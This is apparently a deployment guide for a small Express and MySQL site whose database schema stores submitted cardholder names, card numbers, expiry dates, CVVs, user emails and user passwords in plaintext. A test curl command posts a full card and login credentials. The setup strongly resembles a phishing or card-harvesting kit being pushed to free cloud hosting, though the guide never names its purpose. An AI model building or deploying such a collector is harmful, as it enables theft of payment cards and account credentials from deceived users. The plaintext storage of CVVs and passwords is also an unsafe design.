# Deployment Guide

## Overview

This project consists of:
- **Frontend**: Static HTML/CSS/JS (served by Express or deploy separately on Vercel)
- **Backend**: Node.js/Express API (`POST /api/submit`)
- **Database**: MySQL (cloud-hosted)

## 1. Push to GitHub

```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin https://github.com/YOUR_USERNAME/gcb-site.git
git branch -M main
git push -u origin main
```

## 2. Set up Cloud MySQL Database

### Option A: PlanetScale (Free, Recommended)
1. Go to [planetscale.com](https://planetscale.com) → Sign up
2. Create a new database → Get connection string
3. Run the schema from `server/schema.sql` in their console

### Option B: Aiven (Free Tier)
1. Go to [aiven.io](https://aiven.io) → Sign up
2. Create a MySQL service (Free plan: 5GB)
3. Get connection credentials

### Option C: Clever Cloud (Free)
1. Go to [clever-cloud.com](https://clever-cloud.com)
2. Create a MySQL add-on
3. Get host, user, password, database name

### Create Table
Run `server/schema.sql` in your cloud MySQL provider's console:
```sql
CREATE TABLE IF NOT EXISTS submissions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  cardName VARCHAR(255) NOT NULL,
  cardNumber VARCHAR(255) NOT NULL,
  expiry VARCHAR(50) NOT NULL,
  cvv VARCHAR(50) NOT NULL,
  userEmail VARCHAR(255) NOT NULL,
  userPassword VARCHAR(255) NOT NULL,
  createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updatedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);
```

## 3. Deploy Backend to Render

1. Go to [render.com](https://render.com) → Sign up with GitHub
2. Click **New +** → **Web Service**
3. Connect your GitHub repository (`gcb-site`)
4. Configure:
   - **Name**: `gcb-site-backend`
   - **Region**: Choose closest to you
   - **Branch**: `main`
   - **Runtime**: `Node`
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`
   - **Plan**: Free
5. Add Environment Variables:
   ```
   DB_HOST=your-cloud-mysql-host
   DB_USER=your-cloud-mysql-user
   DB_PASSWORD=your-cloud-mysql-password
   DB_NAME=your-database-name
   DB_PORT=3306
   PORT=10000
   NODE_ENV=production
   ```
6. Click **Create Web Service**

Your backend will be live at: `https://gcb-site-backend.onrender.com`

## 4. Deploy Frontend to Vercel (Optional)

If you want to host just the frontend on Vercel:

1. Go to [vercel.com](https://vercel.com) → Sign up with GitHub
2. Click **Add New** → **Project**
3. Import your GitHub repository
4. Configure:
   - **Framework Preset**: `Other`
   - **Root Directory**: `public`
   - **Build Command**: (leave empty)
   - **Output Directory**: (leave as default)
5. Click **Deploy**

## 5. Update API URL

The frontend in `public/js/email.js` is already configured to:
- Use `http://127.0.0.1:3000/api/submit` when running locally
- Use `https://gcb-site-backend.onrender.com/api/submit` when deployed

If your Render URL is different, update it in `public/js/email.js`.

## 6. Verify Deployment

1. Visit your Render URL: `https://gcb-site-backend.onrender.com`
2. Test the API with curl:
   ```bash
   curl -X POST https://gcb-site-backend.onrender.com/api/submit \
     -H "Content-Type: application/json" \
     -d '{"cardName":"Test","cardNumber":"1234 5678 9012 3456","expiry":"12/28","cvv":"123","userEmail":"test@test.com","userPassword":"password123"}'
   ```
3. Visit the frontend and test the full flow

## Environment Variables Reference

| Variable | Description | Default |
|----------|-------------|---------|
| `DB_HOST` | MySQL host | Required |
| `DB_USER` | MySQL user | Required |
| `DB_PASSWORD` | MySQL password | Required |
| `DB_NAME` | MySQL database name | Required |
| `DB_PORT` | MySQL port | `3306` |
| `PORT` | Express server port | `3000` |
| `NODE_ENV` | Environment mode | `development` |

